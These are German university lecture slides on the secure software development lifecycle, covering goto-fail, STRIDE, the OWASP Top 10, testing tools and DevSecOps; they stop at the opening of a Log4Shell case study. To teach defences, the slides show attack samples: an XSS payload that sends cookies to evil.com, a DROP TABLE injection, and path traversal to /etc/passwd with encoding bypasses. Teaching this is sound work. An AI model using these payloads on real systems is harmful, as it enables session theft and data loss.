---
marp: true
theme: custom
footer: ![w:280](img/dhbw-ka.svg)

---
<!-- _class: title -->
# Secure Software Development Lifecycle (SSDLC)

---

# Agenda

1. **Grundlagen:** SDLC → SSDLC, Shift Left
2. **Motivation:** Exkurs Apple GotoFail
3. **Planung:** Security Requirements, Abuse Cases, Compliance
4. **Design:** Security by Design, Threat Modeling, STRIDE
5. **Implementierung:** OWASP Top 10, Injection, XSS, Secrets
6. **Testing:** SAST, DAST, SCA, Code Review, Fuzzing, Pen-Test
7. **Deployment & Betrieb:** Container-Hardening, DevSecOps
8. **Governance:** OWASP SAMM, Frameworks im Vergleich
9. **Fallstudien:** Log4Shell & Supply Chain Angriffe

---
<!-- _class: chapter -->

# Grundlagen

## Vom SDLC zum SSDLC

---

# **S**oftware **D**evelopment **L**ife**C**ycle

<style scoped>
p { text-align: center; padding-top: 50px  }
</style>
![w:500](img/sdlc.svg)

---

# Was ist der SSDLC? (Definition)

- **Traditionell:** Sicherheit ist ein "Check" am Ende (Penetration Test kurz vor Release).
- **SSDLC:** Ein Framework, das Sicherheitsaktivitäten in **jede Phase** des SDLC integriert.
- **Kernaspekt:** Es geht nicht nur um Tools, sondern um **Kultur, Prozesse und Leute**.

> **Ziel:** Minimierung von Schwachstellen bei gleichzeitiger Beschleunigung der Entwicklung.

---

# Der SSDLC im Überblick

Jede Phase des Entwicklungsprozesses hat dedizierte Security-Aktivitäten:

![w:750 center](img/ssdlc_phasen_overview.svg)

---

# Das "Shift Left" Prinzip
## Die Ökonomie der Sicherheit

Je später ein Fehler entdeckt wird, desto teurer ist seine Behebung.

![w:620 center](img/shift_left_cost.svg)

**Fazit:** Sicherheit früh zu adressieren ist keine "Bremse", sondern eine Versicherungsprämie mit extrem hohem ROI.

---
<!-- _class: chapter -->

# Exkurs: Apple GotoFail

## Wenn eine einzige Zeile Code alles bricht

---

# Exkurs: Apple GotoFail

## Was ist passiert?

Im Februar 2014 entdeckten Sicherheitsforscher eine klaffende Lücke in Apples SSL/TLS-Implementierung.

- **Betroffene Systeme:** iOS 6 & 7, Mac OS X Mavericks (10.9).
- **Die Schwachstelle:** Eine fehlerhafte Zertifikatsvalidierung in der Library `SecureTransport`.
- **Das Resultat:** "Verschlüsselte" Verbindungen waren für Angreifer komplett offen.

---

# Der Code

```c
SSLVerifySignedServerKeyExchange(SSLContext *ctx, bool isRsa, 
                                 SSLBuffer signedParams, uint8_t *signature, 
                                 UInt16 signatureLen)
{
    OSStatus err;
    ...
    if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)
        goto fail;
    if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
        goto fail;
        goto fail; // <--- DER ÜBELTÄTER
    if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
        goto fail;
    ...
fail:
    return err;
}
```

---

# Die Anatomie des Fehlers

Ohne geschweifte Klammern `{ }` bezieht sich ein `if` nur auf die **nächste** Zeile.

- **Der unbedingte Sprung:** Die zweite `goto fail;` Zeile wird **immer** ausgeführt, unabhängig vom Ergebnis der `if`-Abfrage davor.
- **Status "Erfolg":** Da die vorherige Operation erfolgreich war, steht die Variable `err` auf `0` (noErr).
- **Der Bypass:** Die kritische Funktion `SSLHashSHA1.final`, die prüft, ob der private Schlüssel des Servers zum Zertifikat passt, wird einfach übersprungen.
- **Das Resultat:** Die Funktion gibt "Erfolg" zurück, obwohl die Authentizität nie verifiziert wurde.

---

# Die fatalen Auswirkungen

- **Man-in-the-Middle (MITM):** In jedem öffentlichen WLAN (Café, Hotel, Flughafen) konnten Angreifer den gesamten verschlüsselten Datenverkehr mitlesen.
- **Vorgetäuschte Sicherheit:** Safari zeigte das "grüne Schloss" an, obwohl die Identität des Servers nicht bestätigt war.
- **Betroffene Daten:** 
    - Anmeldedaten für E-Mails und soziale Netzwerke.
    - Online-Banking-Informationen.
    - iCloud-Backups und private Fotos.
- **Zeitraum:** Die Lücke war über Monate in iOS und OS X präsent, bevor der Patch veröffentlicht wurde.

---

# Warum wurde der Fehler nicht entdeckt?

Es war ein perfektes Zusammenspiel aus menschlichem Versagen und Prozesslücken.

- **Visuelle Täuschung:** Menschen lesen Code oft anhand von Einrückungen. Die Einrückung suggeriert eine Logik, die für den Compiler nicht existiert.
- **Fehlende "Negative Tests":** Die Test-Suiten prüften vermutlich nur, ob gültige Zertifikate funktionieren. Es fehlte ein automatisierter Test, der sicherstellt, dass ein **ungültiges** Zertifikat abgelehnt wird.
- **Compiler-Warnungen:** Ein moderner Compiler erkennt "Dead Code" (Code, der niemals erreicht wird). Die Zeilen nach dem Fehler waren technisch gesehen unerreichbar. Diese Warnungen wurden entweder ignoriert oder waren in der Build-Umgebung deaktiviert.

---

# Was haben wir daraus gelernt?

Der "goto fail"-Bug wurde zum Standardbeispiel für **Defensive Programming**.

- **Die "Golden Rule" der Brackets:** Verwende *immer* geschweifte Klammern `{ }`, auch wenn das `if`-Statement nur eine einzige Zeile umfasst. 
- **Static Analysis Tools:**
    Moderne Compiler und Linter erkennen "Unreachable Code" sofort. In einer professionellen CI/CD-Pipeline darf Code mit solchen Warnungen niemals gemergt werden.
- **Code Review Kultur:**
    Reviews dürfen keine reine Formsache sein. Ein "Diff" in der Versionskontrolle hätte die doppelte Zeile deutlich gezeigt – sofern man nicht nur die Einrückung überflogen hätte.

---

# Fazit & Takeaway

- **Sicherheit ist fragil:** Ein einziger Copy-Paste-Fehler in Millionen Zeilen Code kann die gesamte Kryptographie einer Plattform wertlos machen.
- **Tools vor Intuition:** Wir können uns nicht auf das menschliche Auge verlassen. Automatisierte Tests und statische Analysen sind das einzige Sicherheitsnetz.
- **Transparenz:** Apple wurde damals scharf für die verzögerte Kommunikation kritisiert. Schnelle Patches und offene Kommunikation sind Teil der Sicherheit.

> **Brücke zum SSDLC:** Hätte Apple einen robusten SSDLC gehabt – mit SAST, Code Reviews und negativen Tests – wäre dieser Bug nie in Produktion gelandet.

---
<!-- _class: chapter -->

# Phase 1: Planung & Requirements

## Sicherheit beginnt vor der ersten Zeile Code

---

# Phasen des SSDLC: Planung & Requirements

## Über funktionale Anforderungen hinaus
- **Security Requirements:** Definition von Sicherheitszielen (Vertraulichkeit, Verfügbarkeit).
- **Compliance:** Berücksichtigung von Standards (DSGVO, ISO 27001, PCI-DSS).
- **Abuse Cases:** 
    - **Functional:** "Nutzer klickt auf 'Bezahlen'."
    - **Abuse:** "Angreifer sendet negativen Betrag beim Bezahlen."
- **Definition of Done (DoD):** Feature ist erst fertig, wenn Security-Scans "grün" sind.

---

# Compliance & Regulatorik: Der rechtliche Rahmen

Security ist oft keine Option, sondern eine gesetzliche Pflicht. In der Requirements-Phase müssen folgende Faktoren geklärt werden:

| Standard | Fokus | Relevanz für SSDLC |
| :--- | :--- | :--- |
| **DSGVO** | Datenschutz (EU) | Privacy by Design, Löschkonzepte. |
| **ISO 27001** | ISMS | Prozesssicherheit & Dokumentation. |
| **PCI-DSS** | Zahlungsverkehr | Strikte Isolation von Kreditkartendaten. |
| **SOC2** | Service Organisation | Nachweis von Kontrollmechanismen. |

> **Merke:** Compliance-Verstöße sind oft teurer als die Implementierung der Sicherheitsmaßnahmen selbst.

---

# Abuse Cases vs. Use Cases

Während ein **Use Case** beschreibt, wie ein System genutzt werden *soll*, beschreibt ein **Abuse Case** das bewusste Fehlverhalten aus Sicht eines Angreifers.

**Vorgehen zur Erstellung:**
1. **Brainstorming:** Was könnte ein böswilliger Akteur mit dieser Funktion tun?
2. **Bedrohungsszenario:** "Als Angreifer möchte ich die SQL-Datenbank auslesen, indem ich Schadcode in das Login-Feld injiziere."
3. **Countermeasure:** Definition einer Anforderung zur Input-Validierung.

**Beispiel für eine Zahlungsfunktion:**

| Use Case | Abuse Case | Gegenmaßnahme |
| :--- | :--- | :--- |
| Nutzer bezahlt 49,99 € | Angreifer sendet -49,99 € | Serverseitige Validierung: Betrag > 0 |
| Nutzer gibt Gutscheincode ein | Brute-Force aller Codes | Rate Limiting, CAPTCHA |

---

# Risiko-Einstufung in der Planung

Nicht jedes Feature benötigt das gleiche Maß an Security-Aufwand. In der Planungsphase erfolgt die **Klassifizierung**:

- **High Risk:** Features mit Internet-Exposition, Zahlungsabwicklung oder Zugriff auf PII (Personenbezogene Daten).
- **Medium Risk:** Interne Tools mit eingeschränktem Nutzerkreis.
- **Low Risk:** Statische Inhalte ohne Nutzereingaben.

**Konsequenz:** Die Risiko-Einstufung bestimmt die Tiefe der Security-Tests und die Priorisierung der Anforderungen.

---

# Definition of Done (DoD) & Security Gates

Security darf kein "Nachtrag" am Ende des Projekts sein. Sie muss integraler Bestandteil der Abnahmekriterien sein.

**Beispielhafte Security-DoD-Checkliste:**
- **Statische Analyse (SAST):** Code wurde gescannt, keine "High"-Vulnerabilities offen.
- **Abhängigkeiten (SCA):** Alle genutzten Libraries sind auf einem sicheren Stand.
- **Threat Model:** Die Bedrohungsanalyse für das Feature wurde aktualisiert.
- **Peer Review:** Ein zweiter Entwickler hat den Code explizit auf Security-Flaws geprüft.

---
<!-- _class: chapter -->

# Phase 2: Design & Architektur

## Die Blaupause absichern

---

# Security by Design Prinzipien

- **Least Privilege:** Komponenten haben nur die minimal nötigen Rechte.
- **Defense in Depth:** Mehrstufige Verteidigung (nicht nur eine Firewall).
- **Secure Defaults:** Standardmäßig ist alles "zu", Funktionen müssen explizit aktiviert werden.
- **Fail Securely:** Wenn ein System abstürzt, darf es keine Backdoors öffnen.
- **Separation of Concerns:** Trennung von Authentifizierung, Autorisierung und Geschäftslogik.
- **Zero Trust:** Keiner Komponente vertrauen – auch nicht internen Diensten.

---

# Threat Modeling

**Wann führen wir es durch?**
Immer wenn sich die Architektur ändert. Es ist die "Prüfung der Blaupause".

**Die 4 Kernfragen:**
1. Was bauen wir? (Diagramm erstellen)
2. Was kann schiefgehen? (Bedrohungen identifizieren)
3. Was tun wir dagegen? (Maßnahmen planen)
4. War das gut so? (Validierung)

---

# Datenflussdiagramme (DFD)

Um Bedrohungen zu finden, nutzen wir Abstraktionen:
- **Prozesse (Kreise):** Programmlogik, Cloud-Functions.
- **Datenspeicher (Parallele Linien):** DBs, S3-Buckets, Caches.
- **Externe Entitäten (Rechtecke):** Enduser, Drittanbieter-APIs.
- **Trust Boundaries (Gepunktete Linien):** Der wichtigste Teil! Hier kreuzen Daten eine Vertrauenszone.

> Dies sind die kritischen Chokepoints für Input-Validierung und Authentifizierung.

---

# DFD-Beispiel: Login-System

![w:680 center](img/dfd_login_example.svg)

---

# STRIDE & Gegenmaßnahmen

| Bedrohung | Schutzziel | Beispiel-Maßnahme |
| :--- | :--- | :--- |
| **S**poofing | Authentizität | MFA, TLS-Zertifikate |
| **T**ampering | Integrität | Digitale Signaturen, Hashes |
| **R**epudiation | Verbindlichkeit | Sicheres Logging, Audit-Trails |
| **I**nformation Disc. | Vertraulichkeit | Verschlüsselung (AES), TLS |
| **D**enial of Service | Verfügbarkeit | Rate Limiting, Redundanz |
| **E**levation of Priv. | Autorisierung | RBAC, Role-Validation |

---

# STRIDE am Beispiel Login-System

- **S (Spoofing):** Jemand klaut ein Passwort $\rightarrow$ WebAuthn / Passkeys.
- **T (Tampering):** Ändern der User-ID im POST-Body $\rightarrow$ Server-side Session Mgmt.
- **R (Repudiation):** Admin löscht Logs seiner Aktionen $\rightarrow$ Read-only Logs extern.
- **I (Information Disc.):** Server verrät "Passwort falsch" statt "Login fehlgeschlagen" $\rightarrow$ User Enumeration.
- **D (DoS):** Brute-Force legt Server lahm $\rightarrow$ Captchas / IP-Blocking.
- **E (Privilege):** Angreifer wird Admin durch Cookie-Manipulation $\rightarrow$ HMAC-Schutz.

---

# Threat Modeling in der Praxis

Threat Modeling ist kein einmaliges Event, sondern ein **lebendes Dokument**.

**Tools:**
- **Microsoft Threat Modeling Tool:** Erstellt DFDs, generiert automatisch STRIDE-Bedrohungen.
- **OWASP Threat Dragon:** Open Source, webbasiert, gut für agile Teams.
- **draw.io / Excalidraw:** Flexibel für individuelle Diagramme.

**Prozess-Integration:**
- Bei jedem **Architektur-Change** aktualisieren.
- Im **Sprint Planning** für neue Features einplanen (30–60 min).
- **Output:** Dokumentiertes Threat Model mit priorisierten Risiken und Maßnahmen.

---
<!-- _class: chapter -->

# Phase 3: Implementierung

## Sicheren Code schreiben

---

# Was ist OWASP?

- **Open Web Application Security Project**
- Eine weltweit aktive Non-Profit-Organisation.
- **Ziel:** Die Sicherheit von Software messbar und sichtbar machen.
- **Die Top 10:** Basieren auf der Analyse von Tausenden Anwendungen und Millionen von Schwachstellen (CWEs).
- Gilt als Industriestandard für Compliance und Pentesting.

---

# Die aktuelle Liste: OWASP Top 10 (2021)

| # | Kategorie | Kurzbeschreibung |
| :--- | :--- | :--- |
| A01 | **Broken Access Control** | Fehlende oder unzureichende Zugriffskontrollen |
| A02 | **Cryptographic Failures** | Schwache oder fehlende Verschlüsselung |
| A03 | **Injection** | SQL, XSS, Command Injection |
| A04 | **Insecure Design** | Architektur-Schwächen, fehlende Threat Models |
| A05 | **Security Misconfiguration** | Default-Passwörter, offene Ports, verbose Errors |
| A06 | **Vulnerable Components** | Bekannte Schwachstellen in Libraries |
| A07 | **Auth. Failures** | Schwache Passwörter, Session-Fehler |
| A08 | **Data Integrity Failures** | Unsichere Deserialisierung, fehlende Signierung |
| A09 | **Logging Failures** | Fehlende Erkennung von Angriffen |
| A10 | **SSRF** | Server-Side Request Forgery |

---

# A01: Broken Access Control
## Was ist das?

- Nutzer können auf Funktionen oder Daten zugreifen, für die sie keine Berechtigung haben.
- Es fehlen serverseitige Prüfungen, ob der aktuelle User die Aktion wirklich ausführen darf.
- **Folge:** Datenlecks, Manipulation von fremden Accounts oder Übernahme von Admin-Rechten.

---

# A01: Beispiel & Erklärung

- **Szenario: Insecure Direct Object Reference (IDOR)**
- Ein User loggt sich ein und sieht sein Profil unter:
  `https://example.com/api/v1/users/1234`
- Der Angreifer ändert die ID in der URL einfach auf:
  `https://example.com/api/v1/users/1235`
- **Erklärung:** Wenn der Server nur prüft, ob der User *eingeloggt* ist, aber nicht, ob ihm die ID `1235` gehört, kann er fremde Daten auslesen.
- **Lösung:** "Deny by default" und konsequente Prüfung der Ownership auf dem Server.

---

# A03: Injection
## Was ist das?

- Nicht vertrauenswürdige Daten werden an einen Interpreter gesendet.
- Der Interpreter (z. B. SQL, Betriebssystem-Shell) kann die Daten nicht von den eigentlichen Befehlen unterscheiden.
- **Folge:** Der Angreifer kann eigene Befehle im Kontext der Anwendung ausführen.

---
# SQL Injection (SQLi)
## Warum ist das so gefährlich?

- **Definition:** Einschleusen von Datenbankbefehlen über Eingabefelder oder Parameter.
- **Ziel:** Umgehung von Logins, Auslesen sensibler Daten (Passwörter, Kreditkarten) oder das Löschen ganzer Tabellen (`DROP TABLE`).
- **Ursache:** Die Vermischung von **Daten** (User-Input) und **Befehl** (SQL-Logik) im selben String.

---

# Wie funktioniert es im Detail?

Stell dir vor, der Server baut folgenden String:
`"SELECT * FROM products WHERE id = " + request.id`

1. **Normaler Aufruf:** `id = 10` 
   -> `SELECT * FROM products WHERE id = 10` (Sicher)
2. **Angriff:** `id = 10; DROP TABLE users`
   -> `SELECT * FROM products WHERE id = 10; DROP TABLE users` (Katastrophe)

**Der Kern des Problems:** Die Datenbank "glaubt", dass der zweite Teil der Eingabe ein rechtmäßiger Befehl des Programmierers ist.

**Varianten:**
- **In-band (Classic):** Ergebnis direkt auf der Website sichtbar.
- **Blind:** Angreifer stellt "Ja/Nein"-Fragen an die DB über Ladezeiten/Fehlermeldungen.
- **Union-based:** `UNION`-Operator, um Daten aus anderen Tabellen einzuschmuggeln.

---

# Die wichtigste Gegenmaßnahme: 
## Prepared Statements (Parameterisierte Abfragen)

Dies ist der **Goldstandard**. Hierbei wird die SQL-Struktur *vorher* an die DB gesendet und der User-Input nur noch als reiner Textwert (Parameter) nachgereicht.

**Beispiel (Java/JDBC):**
```java
// SICHER: Der Input wird niemals als Code ausgeführt
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, userInput); 
ResultSet results = pstmt.executeQuery();
```

---

# Cross-Site Scripting (XSS)
## Was ist das?

- Angreifer schleust **JavaScript-Code** in eine Webseite ein, der im Browser anderer Nutzer ausgeführt wird.
- Der Browser "vertraut" dem Code, weil er von der legitimen Website zu kommen scheint.
- **Folge:** Session-Hijacking, Datendiebstahl, Phishing innerhalb der echten Anwendung.

---

# XSS: Die drei Varianten

| Typ | Mechanismus | Persistenz |
| :--- | :--- | :--- |
| **Reflected** | Schadcode im URL-Parameter, Server gibt ihn in der Antwort zurück | Einmalig (per Link) |
| **Stored** | Schadcode wird in der DB gespeichert (z. B. Forenbeitrag, Profilname) | Dauerhaft |
| **DOM-based** | JavaScript im Browser manipuliert das DOM direkt, Server nicht beteiligt | Einmalig (clientseitig) |

**Beispiel (Stored XSS) – ein Nutzer gibt als "Anzeigename" ein:**
```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```
**Resultat:** Jeder Besucher der Seite sendet seine Session-Cookies an den Angreifer.

---

# XSS: Gegenmaßnahmen

- **Output Encoding (Goldstandard):** Alle dynamischen Daten kontextabhängig escapen:
  - HTML-Kontext: `<` → `&lt;`, `>` → `&gt;`
  - JavaScript-Kontext: Hex-Encoding
  - URL-Kontext: Percent-Encoding
- **Content Security Policy (CSP):** HTTP-Header, der dem Browser verbietet, Inline-Scripts auszuführen.
- **Frameworks nutzen:** React, Angular, Vue escapen standardmäßig – **aber Vorsicht vor `dangerouslySetInnerHTML` / `v-html`!**
- **Input-Validierung:** Ergänzend, aber **nie** als einzige Maßnahme.

---

# Directory Traversal

- **Mechanismus**: Nutzung der `../` Sequenz (Dot-Dot-Slash).
- **Ziel**: Verlassen des vorgesehenen Web-Stammverzeichnisses.
- **Beispiel**:
  - App-Logik: `/var/www/images/` + `Eingabe`
  - Angriff: `../../../etc/passwd`
  - Resultat: Zugriff auf Systemdateien außerhalb der Sandbox.

---

# Directory Traversal: Umgehungstechniken (Bypasses)

Angreifer umgehen einfache Textfilter auf verschiedene Arten:

- **URL-Encoding**: `../` wird zu `%2e%2e%2f` → umgeht Filter, die nur Klartext-Punkte suchen.
- **Doppeltes URL-Encoding**: `%252e%252e%252f` → schrittweise Dekodierung durch Webserver und App.
- **Absolute Pfade**: Direkte Angabe von `/etc/passwd` statt relativer Navigation.
- **Null-Byte-Injection**: `%00` signalisiert Stringende (ältere Systeme) → umgeht automatische Dateiendungen.

**Auswirkungen:** Information Disclosure (DB-Passwörter, API-Keys), Quellcode-Diebstahl, bis hin zu Remote Code Execution via "Log Poisoning".

---

# Directory Traversal: Verteidigung

**Kanonisierung (Goldstandard):**
Den Pfad zuerst auflösen, dann prüfen:
1. `os.path.join(base, input)`
2. `os.path.realpath(path)` (löst `../` auf)
3. Prüfen: Startet der finale Pfad noch mit dem Basisverzeichnis?

**Weitere Maßnahmen:**
- **Indirekte Referenzen:** Nutzer wählt eine ID (z.B. `?id=123`) statt eines Dateinamens.
- **Least Privilege:** Der Web-User darf keine Systemdateien lesen.
- **Isolation:** Chroot-Jails oder Docker-Container zur Eingrenzung des Schadens.

---

# API Security
## Die neue Angriffsfläche

APIs sind das Rückgrat moderner Anwendungen – und ein bevorzugtes Ziel.

**OWASP API Security Top 10 – die häufigsten Probleme:**

| # | Risiko | Beschreibung |
| :--- | :--- | :--- |
| 1 | **BOLA** | Broken Object Level Authorization – wie IDOR, aber bei APIs |
| 2 | **Broken Auth.** | Fehlende oder schwache API-Authentifizierung |
| 3 | **Excessive Data** | API gibt mehr Daten zurück als nötig |
| 4 | **Rate Limiting** | Kein Schutz gegen Brute-Force oder Scraping |
| 5 | **Broken Function Auth.** | Admin-Endpoints ohne Prüfung erreichbar |

**Gegenmaßnahmen:** OAuth 2.0/OIDC, API Gateway mit Rate Limiting, Response Filtering, Schema Validation.

---

# Hardcoded Secrets

Secrets sind digitale Authentifizierungsdaten, die niemals öffentlich werden dürfen:
- API-Keys (AWS, Stripe, Google Maps)
- Datenbank-Passwörter & Connection Strings
- Private SSH-Schlüssel, Auth-Tokens (JWT Secrets)

**Das Kernproblem:**
Einmal in `git` gepusht, bleibt das Secret in der **Commit-History** für immer bestehen, selbst wenn man die Datei im nächsten Commit löscht.

---

# Secrets: Code-Vergleich & Prävention

**❌ FALSCH (Hardcoded):**
```python
client = boto3.client('s3',
    aws_access_key_id='AKIAIOSFODNN7EXAMPLE',
    aws_secret_access_key='wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY')
```

**✅ RICHTIG (Environment Variables):**
```python
client = boto3.client('s3',
    aws_access_key_id=os.getenv('AWS_ACCESS_KEY_ID'),
    aws_secret_access_key=os.getenv('AWS_SECRET_ACCESS_KEY'))
```

**Automatisierte Prävention:**
- **GitLeaks / TruffleHog:** Scannen Repositories (und deren gesamte Historie).
- **Pre-Commit Hooks:** Blockieren `git commit` bei verdächtigen Strings.
- **GitHub Secret Scanning:** Natives Feature, scannt Public Repos und meldet Leaks.

---
<!-- _class: chapter -->

# Phase 4: Testing & Verifikation

## Sicherheit automatisiert und manuell prüfen

---

# Warum Code Reviews unverzichtbar sind

Automatisierte Tools finden viele, aber nicht alle Schwachstellen. **Menschliches Urteilsvermögen** erkennt:
- Logikfehler (z. B. fehlende Autorisierungsprüfung nach Statuswechsel)
- Business-Logik-Bugs (z. B. Race Conditions bei Gutscheincodes)
- Architektur-Schwächen, die kein Scanner versteht

**Security-fokussierte Review-Checkliste:**
- Werden alle Eingaben validiert und sanitized?
- Sind Autorisierungsprüfungen an **jeder** Stelle vorhanden?
- Gibt es Hardcoded Secrets oder Debug-Code?
- Werden Fehler sicher behandelt (keine Stack-Traces an User)?
- Sind kryptographische Funktionen korrekt eingesetzt?

---

# Methoden & Werkzeuge: Die "Toolchain"

Automatisierung ist der Schlüssel zur Skalierung von Sicherheit.

- **SAST (Static Application Security Testing)**
    - *Ansatz:* White-Box (Scannt den Quellcode ohne Ausführung).
    - *Stärke:* Findet Schwachstellen wie Hardcoded Secrets oder `eval()`.
    - *Tools:* SonarQube, Checkmarx, Semgrep.
- **SCA (Software Composition Analysis)**
    - *Ansatz:* Scannt Drittanbieter-Bibliotheken (Open Source).
    - *Stärke:* Erkennt bekannte CVEs in Abhängigkeiten (z.B. Log4Shell).
    - *Tools:* Snyk, GitHub Dependabot, OWASP Dependency-Check.

---

# Methoden & Werkzeuge: Die "Toolchain" (Forts.)

- **DAST (Dynamic Application Security Testing)**
    - *Ansatz:* Black-Box (Testet die laufende Applikation von außen).
    - *Stärke:* Findet Konfigurationsfehler und Laufzeit-Schwachstellen.
    - *Tools:* OWASP ZAP, Burp Suite Enterprise.
- **IAST (Interactive Testing)**
    - *Ansatz:* Hybrid (Agenten innerhalb der Laufzeitumgebung).
    - *Stärke:* Kombiniert SAST & DAST Vorteile; hohe Genauigkeit.
    - *Tools:* Contrast Security, Veracode.

---

# SAST, SCA, DAST im Vergleich

![w:700 center](img/sast_dast_sca_vergleich.svg)

---

# Wie funktionieren SAST-Tools?

- **Syntax-Analyse:** Überprüfung auf unsichere Funktionen oder veraltete Bibliotheken.
- **Datenfluss-Analyse (Taint Analysis):** Verfolgt Daten von der Eingabe (Source) bis zur Verwendung (Sink), um Injection-Lücken zu finden.
- **Kontrollfluss-Analyse:** Untersucht die logische Struktur des Programms auf unerreichbaren Code oder logische Fehler.
- **Strukturelle Analyse:** Prüfung auf Design-Schwächen und Konfigurationsfehler.

---

# Typische Schwachstellen, die SAST findet

Die meisten Tools decken die **OWASP Top 10** ab:

- SQL Injection (SQLi)
- Cross-Site Scripting (XSS)
- Buffer Overflows
- Hardcoded Secrets (Passwörter/Keys im Code)
- Unsichere Kryptographie
- Fehlerhafte Zugriffskontrollen

---

# Integration in die CI/CD Pipeline

SAST sollte automatisiert ablaufen:

- **IDE-Integration:** Plugins für VS Code, IntelliJ etc. (Feedback während des Tippens).
- **Commit-Stage:** Scan bei jedem `git push` oder Pull Request.
- **Build-Server:** Integration in Jenkins, GitLab CI, GitHub Actions.
- **Quality Gates:** Der Build schlägt fehl, wenn kritische Sicherheitslücken gefunden werden ("Break the Build").

---

# Beliebte SAST Tools

## Open Source
- **SonarQube (Community):** Breite Sprachunterstützung, Fokus auf Code Quality & Security.
- **Semgrep:** Leichtgewichtig, schnell, regelbasiert.
- **Bandit:** Speziell für Python-Sicherheit.
- **SpotBugs:** Für Java-Anwendungen.

## Kommerziell
- **Checkmarx:** Sehr tiefgehende Analyse, Enterprise-Standard.
- **Veracode:** Cloud-basierte Plattform.
- **Fortify (OpenText):** Etablierte Lösung für große Unternehmen.
- **Snyk Code:** Entwicklerfreundlich, Fokus auf Open Source Dependencies & Code.

---

# Herausforderungen bei SAST

- **False Positives (Fehlalarme):** Das Tool meldet Probleme, die keine echten Risiken darstellen. Dies kann zu "Alert Fatigue" führen.
- **Sprachabhängigkeit:** Nicht jedes Tool unterstützt jede Programmiersprache oder jedes Framework gleich gut.
- **Zeitaufwand:** Tiefe Scans bei großen Codebasen können lange dauern.
- **Fehlender Kontext:** Da der Code nicht ausgeführt wird, fehlen Laufzeitinformationen (z.B. Serverkonfiguration).

---

# Fuzzing: Zufällige Eingaben, echte Bugs

**Was ist Fuzzing?**
Automatisiertes Testen durch Bombardierung einer Anwendung mit zufälligen, mutierten oder unerwarteten Eingaben.

**Warum?**
- Findet **Edge Cases**, die kein Mensch manuell testen würde.
- Entdeckt Crashes, Memory Leaks, Buffer Overflows.
- Ergänzt SAST & DAST um eine weitere Dimension.

**Bekannte Tools:**
- **AFL (American Fuzzy Lop):** Standard für C/C++-Anwendungen.
- **libFuzzer:** Googles Coverage-guided Fuzzer, in LLVM integriert.
- **Jazzer:** Fuzzing für Java (JVM), findet z. B. Deserialisierungs-Bugs.

> **Praxis-Tipp:** Google nutzt Fuzzing intern und hat damit über 40.000 Bugs in Chrome gefunden.

---

# Penetration Testing: Die letzte Verteidigungslinie

**Abgrenzung zu DAST:**
- DAST ist **automatisiert** und findet bekannte Schwachstellenmuster.
- Pen-Testing ist **manuell** und kreativ – ein Mensch denkt wie ein Angreifer.

**Typischer Ablauf:**
1. **Reconnaissance:** Informationen über das Ziel sammeln.
2. **Scanning:** Automatisierte Schwachstellen-Scans.
3. **Exploitation:** Manuelle Ausnutzung gefundener Lücken.
4. **Reporting:** Dokumentation mit Risikobewertung und Handlungsempfehlungen.

**Ergänzung: Bug Bounty Programme**
- Externe Sicherheitsforscher werden bezahlt, um Schwachstellen zu finden.
- Plattformen: HackerOne, Bugcrowd.
- Vorteil: "Crowdsourced" Sicherheit mit vielen verschiedenen Perspektiven.

---
<!-- _class: chapter -->

# Phase 5: Deployment & Betrieb

## Sicher ausrollen und betreiben

---

# Secure Deployment

Die sicherste Anwendung nützt nichts, wenn das Deployment unsicher ist.

**Container-Hardening:**
- Minimale Base Images (z. B. `alpine` statt `ubuntu`).
- Container niemals als `root` laufen lassen.
- Read-Only Filesystems wo möglich.

**Infrastructure as Code (IaC) Scanning:**
- Terraform, CloudFormation, Kubernetes-Manifeste auf Fehlkonfigurationen prüfen.
- Tools: **Checkov**, **tfsec**, **Trivy** (auch für Container).

**Secrets Management in Produktion:**
- Secrets niemals als Environment Variables im Klartext.
- **HashiCorp Vault**, **AWS Secrets Manager**, **Azure Key Vault**.
- Automatische Rotation von Schlüsseln und Passwörtern.

---

# DevSecOps: Integration in die CI/CD Pipeline

Sicherheit darf die Pipeline nicht stoppen, sondern muss Teil des automatisierten Flusses sein.

![w:700 center](img/devsecops_pipeline.svg)

> **Ziel:** Kontinuierliches Feedback an Entwickler statt dicker Berichte alle 6 Monate.

---
<!-- _class: chapter -->

# Governance & Reifegrad

## Sicherheit messen und verbessern

---

# Reifegradmodelle: OWASP SAMM

Wie misst man, ob ein Unternehmen "sicher" entwickelt? Das **Software Assurance Maturity Model** (SAMM) bietet Struktur in 5 Business-Funktionen:

1.  **Governance:** Strategie, Metriken, Compliance & Schulung.
2.  **Design:** Threat Modeling, Sicherheitsarchitektur.
3.  **Implementation:** Sicherer Build, Deployment & Defect Tracking.
4.  **Verification:** Design-Prüfung, Security Testing.
5.  **Operations:** Incident Management, Environment Hardening.

**Reifegrade:** $0$ (Nichts vorhanden) $\rightarrow$ $3$ (Optimiert & Vollautomatisiert).

**Nutzen:** Standortbestimmung ("Wo stehen wir?"), Roadmap ("Wo wollen wir hin?"), Benchmarking mit der Branche.

---

# SSDLC-Frameworks im Vergleich

Neben OWASP SAMM existieren weitere etablierte Frameworks:

![w:700 center](img/ssdlc_frameworks_vergleich.svg)

---
<!-- _class: chapter -->
# 🔍 Fallstudie: Log4Shell
## Wenn Loggen gefährlich wird (CVE-2021-44228)

---

# Was ist Log4j überhaupt?

- **Definition:** Eine extrem verbreitete Open-Source-Logging-Bibliothek für Java (Apache Software Foundation).
- **Einsatzbereich:** Nahezu überall in der Enterprise-Welt (Cloud-Dienste, Webserver, IoT, Firmenanwendungen).
- **Kernaufgabe:** Textnachrichten über den Status einer Anwendung speichern (z.B. Error-Logs, Login-Versuche).

---

# Die Schwachstelle: Log4Shell

- **Identifikator:** CVE-2021-44228
- **CVSS-Score:** **10.0 (Kritisch)** – Das Maximum auf der Skala.
- **Art des Angriffs:** Remote Code Execution (RCE).
- **Das Problem:** Eine Funktion namens **JNDI Lookup** erlaubte es Angreifern, Schadcode von externen Servern nachzuladen und auszuführen.

---

# Der technische Mechanismus: JNDI & Lookups

Log4j besitzt ein Feature namens "Lookups". Damit können Variablen in Log-Nachrichten dynamisch ersetzt werden.

1.  **Standard-Lookup:** `${java:version}` wird zu "Java version 1.8.0".
